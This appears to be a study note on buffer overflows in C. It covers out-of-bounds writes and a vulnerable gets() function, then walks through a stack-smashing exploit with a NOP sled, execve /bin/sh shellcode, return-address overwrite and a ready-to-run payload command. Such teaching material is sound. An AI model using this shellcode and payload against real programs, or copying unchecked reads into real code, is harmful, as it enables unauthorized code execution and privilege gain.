> [!idea] Buffer Overflow
> A buffer overflow occurs when an operation **interacts with memory outside of a specified array**. This happens when a program writes data beyond the allocated buffer's boundaries.
> 
> - Occurs when accessing array elements beyond its defined size
> - Can overwrite adjacent memory, including other variables or critical data
> - Potential to modify return addresses, leading to arbitrary code execution

> [!example] Simple Buffer Overflow
> ```c
> char name[4];  // Array of 4 characters
> name[5] = 'a'; // Accessing 6th element (index 5) - out of bounds!
> ```
> This example demonstrates writing beyond the array's allocated memory, potentially overwriting adjacent data.

> [!consider] Implications of Buffer Overflows
> - **Data Corruption**: Overwriting adjacent variables or data structures
> - **Security Vulnerabilities**: Potential to modify sensitive information
> - **Control Flow Hijacking**: Overwriting return addresses to execute arbitrary code
> 
> Buffer overflows can be particularly dangerous when they allow attackers to manipulate a program's execution flow, potentially leading to unauthorized access or code execution.

> [!example] Vulnerable C Function
> ```c
> void vulnerable_function() {
>     char buffer[8];
>     int important_flag = 0;
>     
>     printf("Enter your name: ");
>     gets(buffer);  // Dangerous! No bounds checking
>     
>     if (important_flag != 0) {
>         printf("How did you do that?\n");
>     }

> In this example:
> - `buffer` is allocated 8 bytes
> - `important_flag` is stored adjacent to `buffer` in memory
> - `gets()` is used, which doesn't perform bounds checking
> - An attacker could input more than 8 characters to overflow `buffer` and modify `important_flag`
> 
> ```
> Memory layout:
> [buffer (8 bytes)][important_flag (4 bytes)]
> ```
> 
> By inputting 12 or more characters, an attacker overwrites `important_flag`, potentially bypassing security checks or altering program behavior.

> Goal: Execute unauthorized commands by manipulating the program's memory.
> 
> We achieve this by:
> 1. Overflowing the buffer to overwrite the return address (RIP)
> 2. Replacing the return address with a pointer to our malicious code
> 3. Injecting our malicious code (shellcode) into the buffer
> 
> Exploit process:
> 1. Analyze the program's memory layout:
>    - Why? To determine how to craft our payload for successful exploitation
>    - We need to find:
>      - Where our input buffer starts (e.g., address 0xffffd1f0)
>      - Where the return address is stored (e.g., at 0xffffd27c)
>      - How many bytes between these points (offset: 140 bytes)
>    This information is crucial for precisely positioning our payload components
> 
> 2. Craft a payload based on our memory analysis:
>    ```python
>    nop_sled = "\x90" * 80
>    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
>    filler = "A" * 26
>    new_rip = "\xfc\xd1\xff\xff"  # 0xffffd1fc in little-endian
>    payload = nop_sled + shellcode + filler + new_rip
>    ```
> 
>    Payload components and their purposes:
>    - NOP sled: 80 bytes of harmless instructions (0x90) to increase our chances of successful execution
>    - Shellcode: 23 bytes of machine code that will spawn a shell when executed
>    - Filler: 26 bytes of 'A's to reach the exact location of the return address
>    - New return address: Points to our NOP sled, ensuring our shellcode gets executed
> 
>    The NOP sled provides a larger target area in case our address guess is slightly off. We use little-endian format for the new return address to match the system's byte order.
> 
> 3. Feed the payload to the program:
>    ```bash
>    ./vulnerable_program $(python -c 'print "\x90"*80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*26 + "\xfc\xd1\xff\xff"')
>    ```
>    This step delivers our carefully crafted payload to exploit the buffer overflow vulnerability
> 
> 4. Exploit execution:
>    - Our payload overflows the buffer, overwriting the original return address
>    - When func() returns, it jumps to our injected code instead of the intended location
>    - Execution slides through the NOPs to our shellcode
>    - The shellcode runs, spawning a shell with elevated privileges
> 
> This exploit succeeds because the program blindly copies input without checking its length, allowing us to overwrite critical data on the stack and control the program's execution flow.
